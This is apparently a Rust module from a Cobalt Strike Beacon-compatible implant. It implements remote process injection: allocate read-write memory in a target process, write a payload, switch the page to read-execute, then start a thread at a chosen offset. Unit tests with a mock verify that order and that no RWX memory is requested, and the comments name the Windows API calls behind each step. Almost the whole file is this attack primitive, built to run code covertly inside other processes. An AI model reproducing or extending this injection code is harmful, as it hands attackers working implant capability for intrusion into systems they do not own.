//! Fail-closed cross-process inject sequencer for the Beacon inject family.
//!
//! Order is structural: allocate **RW**, write the payload, protect **RX**,
//! THEN create the remote thread at `base + offset`. A protect failure never
//! proceeds to `CreateRemoteThread` — that would execute a still-writable
//! (or RWX) page. Host tests lock this with a recording double so a
//! Windows-only rewrite cannot silently swap the order.
//!
//! Compiled on every host (like [`crate::layout`]) so the contract is
//! exercised in macOS/Linux CI, not only under wine64.

use crate::layout::{PAGE_EXECUTE_READ, PAGE_READWRITE};

/// Target process memory operations. The Windows shim implements this with
/// `VirtualAllocEx` / `WriteProcessMemory` / `VirtualProtectEx` /
/// `CreateRemoteThread` / `VirtualFreeEx`; tests use a recording double.
pub(crate) trait RemoteProcess {
    fn alloc(&mut self, size: usize, protect: u32) -> Option<usize>;
    fn write(&mut self, remote: usize, bytes: &[u8]) -> bool;
    fn protect(&mut self, remote: usize, size: usize, new_protect: u32) -> bool;
    fn create_thread(&mut self, entry: usize, arg: usize) -> bool;
    fn free(&mut self, remote: usize);
}

/// True when `offset` is a valid entry into a payload of `len` bytes.
pub(crate) fn payload_entry_ok(len: i32, offset: i32) -> bool {
    len > 0 && offset >= 0 && (offset as u64) < (len as u64)
}

/// RW alloc → write → RX protect → remote thread at `base + offset`.
///
/// Returns false without creating a thread if any prior step fails. On
/// failure after a successful alloc the remote region is freed so a
/// rejected inject does not leave a private RW/RX page behind.
pub(crate) fn inject_rw_rx_thread<R: RemoteProcess>(
    target: &mut R,
    payload: &[u8],
    payload_offset: i32,
    arg: usize,
) -> bool {
    // Offset is an i32 in the CS ABI; reject before `as usize` so a negative
    // value cannot wrap to a huge entry.
    if payload.is_empty() || payload_offset < 0 || (payload_offset as usize) >= payload.len() {
        return false;
    }
    let len = payload.len();
    let remote = match target.alloc(len, PAGE_READWRITE) {
        Some(p) if p != 0 => p,
        _ => return false,
    };
    if !target.write(remote, payload) {
        target.free(remote);
        return false;
    }
    if !target.protect(remote, len, PAGE_EXECUTE_READ) {
        target.free(remote);
        return false;
    }
    let entry = remote.wrapping_add(payload_offset as usize);
    if !target.create_thread(entry, arg) {
        target.free(remote);
        return false;
    }
    true
}

#[cfg(test)]
mod tests {
    use super::*;

    /// `PAGE_EXECUTE_READWRITE` — the injector must never request this.
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;

    struct Rec {
        ops: Vec<&'static str>,
        protects: Vec<u32>,
        fail_at: Option<&'static str>,
        last_entry: usize,
        last_arg: usize,
        next_base: usize,
    }

    impl Rec {
        fn ok() -> Self {
            Self {
                ops: Vec::new(),
                protects: Vec::new(),
                fail_at: None,
                last_entry: 0,
                last_arg: 0,
                next_base: 0x1000,
            }
        }

        fn fail(op: &'static str) -> Self {
            let mut r = Self::ok();
            r.fail_at = Some(op);
            r
        }

        fn push(&mut self, op: &'static str) -> bool {
            self.ops.push(op);
            self.fail_at != Some(op)
        }
    }

    impl RemoteProcess for Rec {
        fn alloc(&mut self, _size: usize, protect: u32) -> Option<usize> {
            assert_ne!(
                protect, PAGE_EXECUTE_READWRITE,
                "inject must not allocate RWX"
            );
            self.protects.push(protect);
            if !self.push("alloc") {
                return None;
            }
            Some(self.next_base)
        }

        fn write(&mut self, _remote: usize, _bytes: &[u8]) -> bool {
            self.push("write")
        }

        fn protect(&mut self, _remote: usize, _size: usize, new_protect: u32) -> bool {
            assert_ne!(
                new_protect, PAGE_EXECUTE_READWRITE,
                "inject must not protect RWX"
            );
            self.protects.push(new_protect);
            self.push("protect")
        }

        fn create_thread(&mut self, entry: usize, arg: usize) -> bool {
            assert_ne!(
                self.fail_at,
                Some("protect"),
                "CreateRemoteThread must not run when protect failed"
            );
            self.last_entry = entry;
            self.last_arg = arg;
            self.push("thread")
        }

        fn free(&mut self, _remote: usize) {
            let _ = self.push("free");
        }
    }

    #[test]
    fn protect_before_thread_is_rw_then_rx() {
        let mut rec = Rec::ok();
        assert!(inject_rw_rx_thread(&mut rec, &[0xC3], 0, 0x11));
        assert_eq!(rec.ops, ["alloc", "write", "protect", "thread"]);
        assert_eq!(rec.protects, [PAGE_READWRITE, PAGE_EXECUTE_READ]);
        assert_eq!(rec.last_entry, 0x1000);
        assert_eq!(rec.last_arg, 0x11);
    }

    #[test]
    fn offset_is_applied_to_remote_base() {
        let mut rec = Rec::ok();
        // 5-byte payload, entry at offset 4.
        assert!(inject_rw_rx_thread(
            &mut rec,
            &[0x90, 0x90, 0x90, 0x90, 0xC3],
            4,
            0
        ));
        assert_eq!(rec.last_entry, 0x1000 + 4);
    }

    #[test]
    fn protect_failure_never_creates_a_thread() {
        let mut rec = Rec::fail("protect");
        assert!(!inject_rw_rx_thread(&mut rec, &[0xC3], 0, 0));
        assert_eq!(rec.ops, ["alloc", "write", "protect", "free"]);
        assert!(!rec.ops.contains(&"thread"));
    }

    #[test]
    fn write_failure_frees_and_never_protects() {
        let mut rec = Rec::fail("write");
        assert!(!inject_rw_rx_thread(&mut rec, &[0xC3], 0, 0));
        assert_eq!(rec.ops, ["alloc", "write", "free"]);
    }

    #[test]
    fn alloc_failure_is_a_no_op() {
        let mut rec = Rec::fail("alloc");
        assert!(!inject_rw_rx_thread(&mut rec, &[0xC3], 0, 0));
        assert_eq!(rec.ops, ["alloc"]);
    }

    #[test]
    fn thread_failure_frees_rx_region() {
        let mut rec = Rec::fail("thread");
        assert!(!inject_rw_rx_thread(&mut rec, &[0xC3], 0, 0));
        assert_eq!(rec.ops, ["alloc", "write", "protect", "thread", "free"]);
    }

    #[test]
    fn rejects_empty_and_out_of_range_offset() {
        let mut rec = Rec::ok();
        assert!(!inject_rw_rx_thread(&mut rec, &[], 0, 0));
        assert!(rec.ops.is_empty());

        let mut rec = Rec::ok();
        assert!(!inject_rw_rx_thread(&mut rec, &[0xC3], 1, 0));
        assert!(rec.ops.is_empty());

        let mut rec = Rec::ok();
        assert!(!inject_rw_rx_thread(&mut rec, &[0xC3], -1, 0));
        assert!(rec.ops.is_empty());
    }

    #[test]
    fn payload_entry_ok_bounds() {
        assert!(payload_entry_ok(1, 0));
        assert!(!payload_entry_ok(0, 0));
        assert!(!payload_entry_ok(1, 1));
        assert!(!payload_entry_ok(4, -1));
        assert!(payload_entry_ok(4, 3));
    }
}
